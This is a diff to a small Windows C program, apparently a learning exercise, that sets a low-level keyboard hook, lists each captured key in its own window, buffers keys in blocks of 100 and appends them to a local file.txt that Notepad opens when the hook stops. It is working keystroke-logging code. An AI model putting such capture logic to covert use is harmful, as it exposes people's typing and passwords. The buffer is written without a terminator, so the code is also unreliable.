@@ -22,6 +22,7 @@ HHOOK kbLL;
 FILE* f;
 
 
+int buffCount = 0;
 
 
 wchar_t str[MAX_LOADSTRING];
@@ -55,6 +56,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	// TODO: Place code here.
 
 	// Initialize global strings
+	buffCount = 0;
 	LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
 	LoadStringW(hInstance, IDC_HOOKS, szWindowClass, MAX_LOADSTRING);
 	MyRegisterClass(hInstance);
@@ -320,7 +322,7 @@ DWORD   CALLBACK    StartKbHookLL(LPVOID params) {
 DWORD   CALLBACK    StopKbHookLL(LPVOID params) {
 	PROCESS_INFORMATION pInfo;
 	STARTUPINFO sInfo;
-	
+
 
 	ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));
 	ZeroMemory(&sInfo, sizeof(STARTUPINFO));
@@ -328,9 +330,9 @@ DWORD   CALLBACK    StopKbHookLL(LPVOID params) {
 	if (kbLL) {
 
 		UnhookWindowsHookEx(kbLL);
-		_snwprintf_s(str, MAX_LOADSTRING, L"LL hook stopped");
-		CreateProcessW(L"C:\\Windows\\notepad.exe", (LPWSTR)L"C:\\Users\\luce_dp7x\\source\\repos\\Hooks\\\Hooks\\file.txt", NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo);
 		kbLL = NULL;
+		_snwprintf_s(str, MAX_LOADSTRING, L"LL hook stopped");
+		CreateProcessW(L"C:\\Windows\\notepad.exe", (LPWSTR)L"\\W C:\\Users\\luche\\source\\repos\\hooks\\Hooks\\file.txt", NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo);
 	}
 	else {
 
@@ -345,6 +347,20 @@ DWORD   CALLBACK    StopKbHookLL(LPVOID params) {
 	return 0;
 }
 
+
+
+void saveToFile(char* buff) {
+
+
+	f = fopen("file.txt", "at");
+	fputs(buff, f);
+	fclose(f);
+
+
+}
+
+char text[100];
+
 LRESULT CALLBACK    KbHookProcLL(int nCode, WPARAM wParam, LPARAM lParam) {
 
 	if (nCode == HC_ACTION) {
@@ -353,12 +369,20 @@ LRESULT CALLBACK    KbHookProcLL(int nCode, WPARAM wParam, LPARAM lParam) {
 
 			KBDLLHOOKSTRUCT keyInfo = *((KBDLLHOOKSTRUCT*)lParam);
 
-			_snwprintf_s(str, MAX_LOADSTRING, L"%c %d",(char)keyInfo.vkCode, keyInfo.vkCode);
-	SendMessageW(listbox, LB_ADDSTRING, 0, (LPARAM)str);
-			
+			_snwprintf_s(str, MAX_LOADSTRING, L"%c %d %d", (char)keyInfo.vkCode, keyInfo.vkCode, buffCount);
+			SendMessageW(listbox, LB_ADDSTRING, 0, (LPARAM)str);
 
-			f = fopen("file.txt","at");
-			fputc((char)keyInfo.vkCode,f);
+			text[buffCount] = (char)keyInfo.vkCode;
+			buffCount++;
+
+
+			if (buffCount >= 100) {
+				saveToFile(text);
+				strcpy(text,"");
+				buffCount = 0;
+			}
+
+
 
 		}
 
